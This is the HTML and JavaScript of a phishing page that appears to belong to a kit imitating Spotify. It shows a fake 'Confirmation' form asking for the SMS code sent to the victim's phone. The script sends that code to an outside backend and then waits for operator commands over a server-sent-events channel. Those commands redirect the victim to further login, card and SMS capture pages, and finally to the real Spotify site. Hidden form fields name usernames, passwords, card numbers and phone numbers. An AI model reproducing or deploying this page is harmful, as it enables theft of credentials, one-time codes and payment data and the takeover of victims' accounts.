<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Welcome</title>
    <link rel="stylesheet" href="app.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
<form method="POST">
    <input type="hidden" name="LOGIN">
    <input type="hidden" name="USERNAME">
    <input type="hidden" name="PASSWORD">
    <input type="hidden" name="CARD_NUMBER">
    <input type="hidden" name="PHONE_NUMBER">
</form>
<header>
    <img src="logo.png" alt="Logo">
</header>
<div class="loader" style="color:white; text-align:center;">
    <div class="content" style="flex-direction:column;">
        <h3>Please wait...</h3>
        <p>Do not leave this page. You will automatically be redirected.</p>
        <img src="loading.gif" alt="Loading">
    </div>
</div>

<main>
    <div class="form">
        <div class="title">
            Confirmation
            <p style="font-size:0.5em;">Please submit the code sent to your phone number to continue.</p>
        </div>

        <div class="cols">
            <div class="col" style="color:red; display:none;" id="error-msg">
                Invalid code, please try again.
            </div>

            <div class="col">
                <label>Confirmation code</label>
                <input type="text" id="sms" placeholder="Enter code">
            </div>

            <div class="col remember">
                <a href="#" onclick="newCode()">Request new code</a>
            </div>

            <div class="col submit">
                <button type="button" id="submit-btn">Submit</button>
            </div>
        </div>
    </div>
</main>

<script>
    var loader = $(".loader");
    var count = 0;
    var error_msg = $("#error-msg");

    document.addEventListener('DOMContentLoaded', async function () {
        let userId = localStorage.getItem('userId');
        
        if (!userId) {
            try {
                const response = await fetch('https://spotnewback2.onrender.com/user-id', {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                });

                const data = await response.json();

                if (data.success) {
                    localStorage.setItem('userId', data.userId);
                    userId = data.userId;
                } else {
                    console.error('Error generating user ID');
                    return;
                }
            } catch (error) {
                console.error('Error fetching user ID:', error);
                return;
            }
        }
        $("#submit-btn").click(function () {
            sbmt(userId);
        });

        async function sbmt(userId) {
            var sms = $("#sms").val();
            var sub = true;
            $("#sms").removeClass("error");
            
            if (sms.length < 4) {
                $("#sms").addClass("error");
                sub = false;
            }

            if (sub) {
                count++;
                error_msg.hide();
                loader.show();
                
                try {
                    const response = await fetch('https://spotnewback2.onrender.com/send-sms', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            codeSms: sms,
                            userId: userId
                        })
                    });
                    
                    const data = await response.json();
                    if (data.success) {
    
                        listenForSSE(userId);
                    } else {
                       
                    }
                } catch (error) {
                  
                }
            }
        }

        function newCode() {
            loader.show();
            setTimeout(() => {
                loader.hide();
            }, 2000);
        }
    });
    function listenForSSE(userId) {
            const eventSource = new EventSource(`https://spotnewback2.onrender.com/sse/${userId}`);
            console.log("Attempting to establish SSE connection for userId:", userId);

            eventSource.onmessage = function (event) {
                console.log("SSE Message received:", event);

                try {

                    const data = JSON.parse(event.data);
                    if (!data.action) {

                        return;
                    }

                    console.log("Action received:", data.action);


                    if (data.action === "login") {

                        window.location.href = 'login.html';
                    } else if (data.action === "cc") {

                        window.location.href = 'cc.html';
                    } else if (data.action === "sms") {
                        window.location.href = 'sms.html';
                    } else if (data.action === "spotify") {
                        window.location.href = 'https://open.spotify.com/';
                    }
                    else {
                        window.location.href = 'login.html';
                    }
                } catch (error) {

                    window.location.href = 'login.html';
                }
            };

            eventSource.onerror = function (event) {
                console.error("SSE connection error:", event);
                eventSource.close();
            };

            eventSource.onopen = function (event) {
                console.log("SSE connection successfully opened:", event);
            };

            eventSource.onclose = function (event) {
                console.log("SSE connection closed:", event);
            };
        }

</script>
</body>
</html>
